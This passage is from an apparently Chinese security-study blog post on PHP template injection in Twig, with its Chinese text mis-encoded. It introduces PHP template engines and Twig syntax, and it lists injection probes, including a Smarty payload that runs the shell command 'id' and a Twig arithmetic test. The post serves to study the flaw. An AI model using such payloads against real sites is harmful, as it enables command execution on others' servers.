<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>PHPæ¨¡æ¿æ³¨å…¥æ¼æ´-Twigç¯‡ | hadaçš„ä¸ªäººåšå®¢</title><meta name="author" content="hada"><meta name="copyright" content="hada"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="è¯¥æ–‡ç« è¯¦ç»†è®°å½•äº†PHP Twigæ¨¡æ¿å¼•æ“çš„æˆå› ã€åˆ©ç”¨æ–¹å¼å’Œè§£æ">
<meta property="og:type" content="article">
<meta property="og:title" content="PHPæ¨¡æ¿æ³¨å…¥æ¼æ´-Twigç¯‡">
<meta property="og:url" content="http://hadagaga.github.io/2025/03/03/PHPsstiTwig/index.html">
<meta property="og:site_name" content="hadaçš„ä¸ªäººåšå®¢">
<meta property="og:description" content="è¯¥æ–‡ç« è¯¦ç»†è®°å½•äº†PHP Twigæ¨¡æ¿å¼•æ“çš„æˆå› ã€åˆ©ç”¨æ–¹å¼å’Œè§£æ">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://hadagaga.github.io/img/PHP-ssti-Twig/cover.png">
<meta property="article:published_time" content="2025-03-02T16:00:00.000Z">
<meta property="article:modified_time" content="2025-05-09T11:49:26.678Z">
<meta property="article:author" content="hada">
<meta property="article:tag" content="PHP">
<meta property="article:tag" content="SSTI">
<meta property="article:tag" content="Twig">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://hadagaga.github.io/img/PHP-ssti-Twig/cover.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "PHPæ¨¡æ¿æ³¨å…¥æ¼æ´-Twigç¯‡",
  "url": "http://hadagaga.github.io/2025/03/03/PHPsstiTwig/",
  "image": "http://hadagaga.github.io/img/PHP-ssti-Twig/cover.png",
  "datePublished": "2025-03-02T16:00:00.000Z",
  "dateModified": "2025-05-09T11:49:26.678Z",
  "author": [
    {
      "@type": "Person",
      "name": "hada",
      "url": "http://hadagaga.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favico.ico"><link rel="canonical" href="http://hadagaga.github.io/2025/03/03/PHPsstiTwig/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"ç¹","msgToSimplifiedChinese":"ç°¡"},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶å¤±è´¥',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'åŠ è½½æ›´å¤š'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'PHPæ¨¡æ¿æ³¨å…¥æ¼æ´-Twigç¯‡',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/background.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/headimg.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> å½’æ¡£</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> åˆ†ç±»</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/PHP-ssti-Twig/cover.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/headimg.jpg" alt="Logo"><span class="site-name">hadaçš„ä¸ªäººåšå®¢</span></a><a class="nav-page-title" href="/"><span class="site-name">PHPæ¨¡æ¿æ³¨å…¥æ¼æ´-Twigç¯‡</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> å½’æ¡£</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> åˆ†ç±»</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">PHPæ¨¡æ¿æ³¨å…¥æ¼æ´-Twigç¯‡</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2025-03-02T16:00:00.000Z" title="å‘è¡¨äº 2025-03-03 00:00:00">2025-03-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2025-05-09T11:49:26.678Z" title="æ›´æ–°äº 2025-05-09 19:49:26">2025-05-09</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">æ¼æ´å­¦ä¹ è®°å½•</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">æµè§ˆé‡:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="PHPå¸¸è§æ¨¡æ¿å¼•æ“"><a href="#PHPå¸¸è§æ¨¡æ¿å¼•æ“" class="headerlink" title="PHPå¸¸è§æ¨¡æ¿å¼•æ“"></a>PHPå¸¸è§æ¨¡æ¿å¼•æ“</h2><blockquote>
<p>Twig </p>
<p>Twigæ˜¯æ¥è‡ªäºSymfonyçš„æ¨¡æ¿å¼•æ“ï¼Œå®ƒéå¸¸æ˜“äºå®‰è£…å’Œä½¿ç”¨ã€‚å®ƒçš„æ“ä½œæœ‰ç‚¹åƒMustacheå’Œliquidã€‚</p>
<p>Smarty </p>
<p>Smartyç®—æ˜¯ä¸€ç§å¾ˆè€çš„PHPæ¨¡æ¿å¼•æ“äº†ï¼Œéå¸¸çš„ç»å…¸ï¼Œä½¿ç”¨çš„æ¯”è¾ƒå¹¿æ³›ã€‚  </p>
<p>Blade </p>
<p>Blade æ˜¯ Laravel æä¾›çš„ä¸€ä¸ªæ—¢ç®€å•åˆå¼ºå¤§çš„æ¨¡æ¿å¼•æ“ã€‚ </p>
<p>å’Œå…¶ä»–æµè¡Œçš„ PHP æ¨¡æ¿å¼•æ“ä¸ä¸€æ ·ï¼ŒBlade å¹¶ä¸é™åˆ¶ä½ åœ¨è§†å›¾ä¸­ä½¿ç”¨åŸç”ŸPHPä»£ç ã€‚æ‰€æœ‰Bladeè§†å›¾æ–‡ä»¶éƒ½å°†è¢«ç¼–è¯‘æˆåŸç”Ÿçš„PHPä»£ç å¹¶ç¼“å­˜èµ·æ¥ï¼Œé™¤éå®ƒè¢«ä¿®æ”¹ï¼Œå¦åˆ™ä¸ä¼šé‡æ–°ç¼–è¯‘ï¼Œè¿™å°±æ„å‘³ç€ BladeåŸºæœ¬ä¸Šä¸ä¼šç»™ä½ çš„åº”ç”¨å¢åŠ ä»»ä½•é¢å¤–è´Ÿæ‹…ã€‚</p>
</blockquote>
<h2 id="æ¨¡æ¿å¼•æ“payloadæ ¼å¼"><a href="#æ¨¡æ¿å¼•æ“payloadæ ¼å¼" class="headerlink" title="æ¨¡æ¿å¼•æ“payloadæ ¼å¼"></a>æ¨¡æ¿å¼•æ“payloadæ ¼å¼</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Smarty </span><br><span class="line">&#123;php&#125;echo `id`;&#123;/php&#125; //åœ¨smarty 3.Xä¸­åºŸå¼ƒ </span><br><span class="line">&#123;&#125;</span><br><span class="line">&#123;literal&#125; //PHP5ä¸­é€‚ç”¨ </span><br><span class="line">&#123;if&#125;&#123;/if&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">Twig </span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="number">2</span>*<span class="number">3</span>&#125;&#125;</span><span class="language-xml"> </span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Blade </span><br><span class="line">&#123;&#123;&#125;&#125; </span><br><span class="line">&#123;!! !!&#125;</span><br></pre></td></tr></table></figure>
â€‹	åœ¨PHPä¸­å¦‚æœä½¿ç”¨äº†å¦‚ä¸Šæ‰€è¿°çš„æ¨¡æ¿å¼•æ“ï¼Œåœ¨è¿™äº›æ¨¡æ¿å¼•æ“ä¹‹ä¸­åˆ†åˆ«åˆ©ç”¨ä¸åŒçš„æ¨¡æ¿å‡½æ•°è¿›è¡Œæ¨¡æ¿çš„æ¸²æŸ“ï¼Œå¦‚æœå‡½æ•°ä¸­å­˜åœ¨å¯æ§å‚æ•°ï¼Œé‚£ä¹ˆå¾ˆå¤§æ¦‚ç‡ä¼šå­˜åœ¨SSTIæ¨¡æ¿æ³¨å…¥ï¼Œä¸‹é¢æˆ‘ä»¬é€šè¿‡ä»‹ç»ä¸Šè¿°ä¸åŒçš„æ¨¡æ¿å¼•æ“æ¥å¼•å‡ºå¼•æ“ä¸­çš„SSTIç›¸å…³å‡½æ•°ã€‚

<h2 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h2><h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>â€‹	Twigæ˜¯ä¸€æ¬¾çµæ´»ã€å¿«é€Ÿã€å®‰å…¨çš„PHPæ¨¡æ¿å¼•æ“ã€‚å¦‚æœä½ æ¥è§¦è¿‡å…¶ä»–åŸºäºæ–‡æœ¬çš„æ¨¡æ¿è¯­è¨€ï¼Œæ¯”å¦‚ Smartyã€Djangoã€æˆ–è€…Jinjaï¼Œä½ ä¾¿èƒ½è½»æ¾æŒæ¡Twigã€‚å®ƒåšæŒPHPçš„åŸåˆ™ï¼Œå¹¶ä¸ºæ¨¡æ¿ç¯å¢ƒæ·»åŠ äº†æœ‰ç”¨çš„åŠŸèƒ½ï¼Œä½¿å…¶åŒæ—¶ä¿æŒå¯¹è®¾è®¡å¸ˆå’Œå¼€å‘è€…å‹å¥½ã€‚</p>
<p>â€‹	Twigç”±ä¸€ä¸ªçµæ´»çš„è¯æ³•åˆ†æå™¨å’Œè§£æå™¨é©±åŠ¨ã€‚è¿™ä½¿å¾—å¼€å‘è€…å¯ä»¥è‡ªå®šä¹‰æ ‡ç­¾å’Œè¿‡æ»¤å™¨ï¼Œå¹¶åˆ›å»ºè‡ªå·±çš„DSLã€‚</p>
<p>â€‹	Twigå·²è¢«ç”¨äºè®¸å¤šå¼€æºé¡¹ç›®ï¼Œæ¯”å¦‚Symfony, Drupal8, eZPublish,phpBB, Piwik, OroCRMï¼›å¹¶ä¸”è®¸å¤šæ¡†æ¶ä¹Ÿæ”¯æŒå®ƒï¼Œä¾‹å¦‚Slim, Yii, Laravel, Codeigniter and Kohanaã€‚</p>
<h3 id="åŸºç¡€è¯­æ³•"><a href="#åŸºç¡€è¯­æ³•" class="headerlink" title="åŸºç¡€è¯­æ³•"></a>åŸºç¡€è¯­æ³•</h3><blockquote>
<p>æ³¨æ„ï¼šè¯¥æ¨¡å—ä»¥ä¸‹æ‰€æœ‰è¯­å¥æµ‹è¯•æ‰€ç”¨ç‰ˆæœ¬å‡ä¸º<strong>Twig 1.16.1</strong>ã€‚å¦‚è‹¥å‡ºç°è¯­æ³•é”™è¯¯ï¼Œåˆ™å¯èƒ½æ˜¯ç‰ˆæœ¬å…¼å®¹æ€§é—®é¢˜</p>
</blockquote>
<h4 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h4><p>â€‹	åº”ç”¨ç¨‹åºå°†å˜é‡ä¼ å…¥æ¨¡æ¿ä¸­è¿›è¡Œå¤„ç†ï¼Œå˜é‡å¯ä»¥åŒ…å«ä½ èƒ½è®¿é—®çš„å±æ€§æˆ–å…ƒç´ ã€‚ä½ å¯ä»¥ä½¿ç”¨ <code>.</code>æ¥è®¿é—®å˜é‡ä¸­çš„å±æ€§ï¼ˆæ–¹æ³•æˆ– PHP å¯¹è±¡çš„å±æ€§ï¼Œæˆ– PHP æ•°ç»„å•å…ƒï¼‰ï¼ŒTwigè¿˜æ”¯æŒè®¿é—®PHPæ•°ç»„ä¸Šçš„é¡¹çš„ç‰¹å®šè¯­æ³•ï¼Œ å…¶ä¸­å¯¹äº<code>hada[&#39;gaga&#39;]</code>çš„è®¿é—®ç¤ºä¾‹å¦‚ä¸‹ï¼š</p>

<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123; hada.gaga &#125;&#125;</span><span class="template-variable">&#123;&#123; hada[<span class="string">&#x27;gaga&#x27;</span>] &#125;&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="å…¨å±€å˜é‡"><a href="#å…¨å±€å˜é‡" class="headerlink" title="å…¨å±€å˜é‡"></a>å…¨å±€å˜é‡</h4><p>â€‹	Twigæ¨¡æ¿ä¸­å­˜åœ¨è¿™äº›å…¨å±€å˜é‡ï¼š</p>
<blockquote>
<p>_selfï¼šå¼•ç”¨å½“å‰æ¨¡æ¿åç§°ï¼›ï¼ˆåœ¨twig1.xå’Œ2.x&#x2F;3.xä½œç”¨ä¸ä¸€ï¼‰<br>_contextï¼šå¼•ç”¨å½“å‰ä¸Šä¸‹æ–‡ï¼›<br>_charsetï¼šå¼•ç”¨å½“å‰å­—ç¬¦é›†ã€‚</p>
</blockquote>
<h4 id="å£°æ˜å˜é‡"><a href="#å£°æ˜å˜é‡" class="headerlink" title="å£°æ˜å˜é‡"></a>å£°æ˜å˜é‡</h4><p>â€‹	ä¸ºä»£ç å—å†…çš„å˜é‡èµ‹å€¼ã€‚èµ‹å€¼ä½¿ç”¨<code>set</code>æ ‡ç­¾ï¼š</p>

<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">set</span> hada = <span class="string">&#x27;gaga&#x27;</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">set</span> hada = [<span class="number">1</span>, <span class="number">2</span>] <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">set</span> hada = &#123;<span class="string">&#x27;hada&#x27;</span>: <span class="string">&#x27;gaga&#x27;</span>&#125; <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="è¿‡æ»¤å™¨"><a href="#è¿‡æ»¤å™¨" class="headerlink" title="è¿‡æ»¤å™¨"></a>è¿‡æ»¤å™¨</h4><h5 id="ä½œç”¨"><a href="#ä½œç”¨" class="headerlink" title="ä½œç”¨"></a>ä½œç”¨</h5><p>â€‹	è¿‡æ»¤å™¨ç”¨äºå¯¹å˜é‡å†…å®¹è¿›è¡Œæ ¼å¼åŒ–æˆ–ä¿®æ”¹æ“ä½œï¼Œç±»ä¼¼äºç®¡é“å¤„ç†ï¼ˆå¦‚ï¼š<code>&#123;&#123; var|filter &#125;&#125;</code>ï¼‰ï¼Œå¸¸ç”¨äºï¼š</p>
<blockquote>
<ul>
<li>æ–‡æœ¬æ ¼å¼åŒ–ï¼ˆå¤§å°å†™è½¬æ¢ã€æˆªæ–­ç­‰ï¼‰</li>
<li>æ•°æ®è½¬æ¢ï¼ˆæ—¥æœŸæ ¼å¼åŒ–ã€JSONç¼–ç ç­‰ï¼‰</li>
<li>é›†åˆå¤„ç†ï¼ˆæ’åºã€åˆ‡ç‰‡ç­‰ï¼‰</li>
<li>é€»è¾‘åˆ¤æ–­ï¼ˆé»˜è®¤å€¼è®¾ç½®ç­‰ï¼‰</li>
</ul>
</blockquote>
<h5 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h5>
<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&#123;# åŸºç¡€ç”¨æ³• #&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123; variable<span class="punctuation">|</span>filterName &#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="comment">&#123;# å¸¦å‚æ•°ç”¨æ³• #&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123; variable<span class="punctuation">|</span>filterName(arg<span class="number">1</span>, arg<span class="number">2</span>) &#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="comment">&#123;# é“¾å¼è°ƒç”¨ #&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123; variable<span class="punctuation">|</span><span class="keyword">filter</span><span class="number">1</span><span class="punctuation">|</span><span class="keyword">filter</span><span class="number">2</span> &#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>â€‹	è‹¥è¦å¯¹ä»£ç éƒ¨åˆ†åº”ç”¨ç­›é€‰å™¨ï¼Œä½¿ç”¨<code>apply</code>æ ‡ç­¾æˆ–è€…<code>filter</code>æ ‡ç­¾ï¼š</p>

<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">apply</span> upper <span class="template-tag">%&#125;</span><span class="language-xml">This text becomes uppercase</span><span class="template-tag">&#123;%</span> <span class="name">endapply</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">filter</span> upper <span class="template-tag">%&#125;</span><span class="language-xml">This text becomes uppercase</span><span class="template-tag">&#123;%</span> <span class="name">endfilter</span> <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure>

<p>â€‹	å…¶ä¸­<code>apply</code>æ ‡ç­¾åœ¨Twig <strong>1.40 ç‰ˆæœ¬ä¹‹å‰ä¸å­˜åœ¨</strong>ï¼Œè€Œ<code>filter</code>æ ‡ç­¾<strong>å…¼å®¹æ‰€æœ‰</strong> Twig 1.x ç‰ˆæœ¬</p>
<blockquote>
<p>å®˜æ–¹è¯´æ˜ï¼š<code>apply</code> æ˜¯ <code>filter</code> çš„åˆ«åï¼ŒäºŒè€…åŠŸèƒ½å®Œå…¨ä¸€è‡´ï¼Œæ›´æ–°åå»ºè®®ä¼˜å…ˆä½¿ç”¨ <code>apply</code> ä»¥ä¿æŒä¸ Twig 3.x çš„å…¼å®¹æ€§</p>
</blockquote>
<h5 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h5><h6 id="æ—¥æœŸæ ¼å¼åŒ–-date"><a href="#æ—¥æœŸæ ¼å¼åŒ–-date" class="headerlink" title="æ—¥æœŸæ ¼å¼åŒ– (date)"></a>æ—¥æœŸæ ¼å¼åŒ– (<code>date</code>)</h6>
<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123; post.date<span class="punctuation">|</span><span class="keyword">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>) &#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="comment">&#123;# è¾“å‡ºï¼š2023-07-20 14:30:00 #&#125;</span></span><br></pre></td></tr></table></figure>

<h6 id="å¤§å°å†™è½¬æ¢"><a href="#å¤§å°å†™è½¬æ¢" class="headerlink" title="å¤§å°å†™è½¬æ¢"></a>å¤§å°å†™è½¬æ¢</h6>
<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123; <span class="string">&#x27;Hello World&#x27;</span><span class="punctuation">|</span><span class="keyword">lower</span> &#125;&#125;</span><span class="language-xml"> </span><span class="comment">&#123;# è¾“å‡ºï¼šhello world #&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123; <span class="string">&#x27;hello world&#x27;</span><span class="punctuation">|</span><span class="keyword">upper</span> &#125;&#125;</span><span class="language-xml"> </span><span class="comment">&#123;# è¾“å‡ºï¼šHELLO WORLD #&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123; <span class="string">&#x27;hello world&#x27;</span><span class="punctuation">|</span><span class="keyword">capitalize</span> &#125;&#125;</span><span class="language-xml"> </span><span class="comment">&#123;# è¾“å‡ºï¼šHello World #&#125;</span></span><br></pre></td></tr></table></figure>

<h6 id="é»˜è®¤å€¼-default"><a href="#é»˜è®¤å€¼-default" class="headerlink" title="é»˜è®¤å€¼ (default)"></a>é»˜è®¤å€¼ (<code>default</code>)</h6>
<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123; user.name<span class="punctuation">|</span><span class="keyword">default</span>(<span class="string">&#x27;Anonymous&#x27;</span>) &#125;&#125;</span><span class="language-xml"> </span></span><br><span class="line"><span class="language-xml"></span><span class="comment">&#123;# å½“user.nameæœªå®šä¹‰æ—¶è¾“å‡º Anonymous #&#125;</span></span><br></pre></td></tr></table></figure>

<h6 id="æ•°ç»„åˆ‡ç‰‡-slice"><a href="#æ•°ç»„åˆ‡ç‰‡-slice" class="headerlink" title="æ•°ç»„åˆ‡ç‰‡ (slice)"></a>æ•°ç»„åˆ‡ç‰‡ (<code>slice</code>)</h6>
<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123; [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]<span class="punctuation">|</span><span class="keyword">slice</span>(<span class="number">1</span>, <span class="number">3</span>)<span class="punctuation">|</span><span class="keyword">join</span>(<span class="string">&#x27;, &#x27;</span>) &#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="comment">&#123;# è¾“å‡ºï¼š2, 3, 4ï¼ˆä»ç´¢å¼•1å¼€å§‹å–3ä¸ªå…ƒç´ ï¼‰#&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="æ§åˆ¶ç»“æ„"><a href="#æ§åˆ¶ç»“æ„" class="headerlink" title="æ§åˆ¶ç»“æ„"></a>æ§åˆ¶ç»“æ„</h4>
â€‹	æ§åˆ¶ç»“æ„æ˜¯æŒ‡æ‰€æœ‰æ§åˆ¶ç¨‹åºæµçš„ä»£ç ï¼Œä¾‹å¦‚æ¡ä»¶è¯­å¥ï¼Œå¾ªç¯è¯­å¥ä»¥åŠæ¡ä»¶+å¾ªç¯ç»„åˆçš„ä»£ç å—ã€‚æ§åˆ¶ç»“æ„ä½¿ç”¨{%%}ã€‚

<h5 id="æ¡ä»¶è¯­å¥ï¼ˆifè¯­å¥ï¼‰ï¼š"><a href="#æ¡ä»¶è¯­å¥ï¼ˆifè¯­å¥ï¼‰ï¼š" class="headerlink" title="æ¡ä»¶è¯­å¥ï¼ˆifè¯­å¥ï¼‰ï¼š"></a>æ¡ä»¶è¯­å¥ï¼ˆ<code>if</code>è¯­å¥ï¼‰ï¼š</h5><h6 id="åŸºç¡€ç”¨æ³•"><a href="#åŸºç¡€ç”¨æ³•" class="headerlink" title="åŸºç¡€ç”¨æ³•"></a>åŸºç¡€ç”¨æ³•</h6>
